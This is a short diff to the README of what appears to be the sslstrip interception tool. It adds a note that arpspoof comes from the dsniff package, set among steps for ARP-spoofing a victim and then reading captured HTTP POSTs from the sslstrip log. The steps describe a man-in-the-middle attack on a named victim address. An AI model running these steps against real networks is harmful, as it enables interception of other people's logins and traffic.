@@ -71,4 +71,6 @@ The four steps to getting this working (assuming you're running Linux) are:
 
    `arpspoof -i <yourNetworkdDevice> -t <victimIpAddress> <routerIpAddress>`
 
+   > `arpspoof` is part of the `dsniff` suite. In Debian-like distros you can install it with `apt update && apt install dsniff`
+
 5) Start a network sniffer (e.g. wireshark, tcpdump) or directly look for HTTP posts in the sslstrip log file (`sslstrip.log` by default)
